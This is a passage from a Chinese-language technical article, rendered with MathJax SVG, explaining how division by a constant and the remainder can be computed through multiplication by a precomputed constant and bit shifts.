<strong>乘法和移位</strong> 方案中的计算方式： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.827ex;" xmlns="http://www.w3.org/2000/svg" width="30.545ex" height="6.948ex" role="img" focusable="false" viewBox="0 -1821.6 13500.7 3071.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mrow"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="230A" d="M246 -949V1450H308V-887H571V-949H246Z"></path></g><g data-mml-node="mfrac" transform="translate(583,0)"><g data-mml-node="mi" transform="translate(220,676)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(261,-686)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><rect width="772" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(1595,0) translate(0 -0.5)"><path data-c="230B" d="M274 -887V1450H336V-949H11V-887H274Z"></path></g></g><g data-mml-node="mo" transform="translate(2455.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mrow" transform="translate(3511.6,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="230A" d="M224 -649V1150H275V-598H511V-649H224Z"></path></g><g data-mml-node="mfrac" transform="translate(528,0)"><g data-mml-node="mrow" transform="translate(220,676)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(1294.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msup" transform="translate(848.9,-686)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,289) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><rect width="2372.4" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(3140.4,0) translate(0 -0.5)"><path data-c="230B" d="M252 -598V1150H303V-649H16V-598H252Z"></path></g></g><g data-mml-node="mo" transform="translate(7457.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mrow" transform="translate(8513.6,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="230A" d="M269 -1249V1750H342V-1176H633V-1249H269Z"></path></g><g data-mml-node="mfrac" transform="translate(639,0)"><g data-mml-node="mrow" transform="translate(220,950)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1294.4,0)"><path data-c="2308" d="M174 734Q178 746 190 750H298H369Q400 750 411 747T422 730T411 713T372 709Q365 709 345 709T310 710H214V-235Q206 -248 196 -250Q192 -250 189 -249T184 -247T180 -244T178 -241T176 -237T174 -234V734Z"></path></g><g data-mml-node="mfrac" transform="translate(1738.4,0)"><g data-mml-node="msup" transform="translate(220,394) scale(0.707)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,363) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mi" transform="translate(370.1,-345) scale(0.707)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><rect width="846.7" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(2825.2,0)"><path data-c="2309" d="M21 717T21 730T32 746T75 750H147H256Q266 742 269 735V-235Q262 -248 251 -250Q247 -250 244 -249T239 -247T235 -244T233 -241T231 -237T229 -234V710H133Q119 710 99 710T71 709Q43 709 32 713Z"></path></g></g><g data-mml-node="msup" transform="translate(1397.3,-686)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,289) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><rect width="3469.2" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(4348.2,0) translate(0 -0.5)"><path data-c="230B" d="M296 -1176V1750H369V-1249H5V-1176H296Z"></path></g></g></g></g></svg></mjx-container></span> 在这里，我们所做的操作是通过一个浮点常量 <code>m</code> 来乘以
<code>x</code>，然后通过移位和取整来实现。</p>
<p>如果我们不是取高位（整数部分），而是取低位，这就对应于小数部分。如果我们再将其乘以除数
<code>y</code>，并取整，就能得到余数： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.148ex;" xmlns="http://www.w3.org/2000/svg" width="32.627ex" height="5.428ex" role="img" focusable="false" viewBox="0 -1449.5 14421 2399"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(728.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mrow" transform="translate(1784.6,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="230A" d="M246 -949V1450H308V-887H571V-949H246Z"></path></g><g data-mml-node="mrow" transform="translate(583,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="28" d="M701 -940Q701 -943 695 -949H664Q662 -947 636 -922T591 -879T537 -818T475 -737T412 -636T350 -511T295 -362T250 -186T221 17T209 251Q209 962 573 1361Q596 1386 616 1405T649 1437T664 1450H695Q701 1444 701 1441Q701 1436 681 1415T629 1356T557 1261T476 1118T400 927T340 675T308 359Q306 321 306 250Q306 -139 400 -430T690 -924Q701 -936 701 -940Z"></path></g><g data-mml-node="mo" transform="translate(736,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1125,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1919.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(2419.4,0)"><path data-c="2308" d="M174 734Q178 746 190 750H298H369Q400 750 411 747T422 730T411 713T372 709Q365 709 345 709T310 710H214V-235Q206 -248 196 -250Q192 -250 189 -249T184 -247T180 -244T178 -241T176 -237T174 -234V734Z"></path></g><g data-mml-node="mfrac" transform="translate(2863.4,0)"><g data-mml-node="msup" transform="translate(220,676)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,363) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mi" transform="translate(432.3,-686)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><rect width="1114.6" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(4218.1,0)"><path data-c="2309" d="M21 717T21 730T32 746T75 750H147H256Q266 742 269 735V-235Q262 -248 251 -250Q247 -250 244 -249T239 -247T235 -244T233 -241T231 -237T229 -234V710H133Q119 710 99 710T71 709Q43 709 32 713Z"></path></g><g data-mml-node="mo" transform="translate(4662.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mspace" transform="translate(5051.1,0)"></g><g data-mml-node="mi" transform="translate(6217.7,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(8106.7,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(8273.7,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="msup" transform="translate(8607.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mo" transform="translate(9522,0) translate(0 -0.5)"><path data-c="29" d="M34 1438Q34 1446 37 1448T50 1450H56H71Q73 1448 99 1423T144 1380T198 1319T260 1238T323 1137T385 1013T440 864T485 688T514 485T526 251Q526 134 519 53Q472 -519 162 -860Q139 -885 119 -904T86 -936T71 -949H56Q43 -949 39 -947T34 -937Q88 -883 140 -813Q428 -430 428 251Q428 453 402 628T338 922T245 1146T145 1309T46 1425Q44 1427 42 1429T39 1433T36 1436L34 1438Z"></path></g></g><g data-mml-node="mo" transform="translate(11063.3,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(11563.5,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(12053.5,0) translate(0 -0.5)"><path data-c="230B" d="M274 -887V1450H336V-949H11V-887H274Z"></path></g></g></g></g></svg></mjx-container></span>
这样就能精确地得到余数。其工作原理是通过将浮点乘法链式组合来得到一个非常精确的结果，且误差是常量级别的
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.405ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1947 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(1558,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>，其中 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex;" xmlns="http://www.w3.org/2000/svg" width="9.881ex" height="2.737ex" role="img" focusable="false" viewBox="0 -864.9 4367.3 1209.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(683.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1739.6,0)"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(2502.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mfrac" transform="translate(2891.6,0)"><g data-mml-node="mn" transform="translate(366.6,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="msup" transform="translate(220,-345) scale(0.707)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 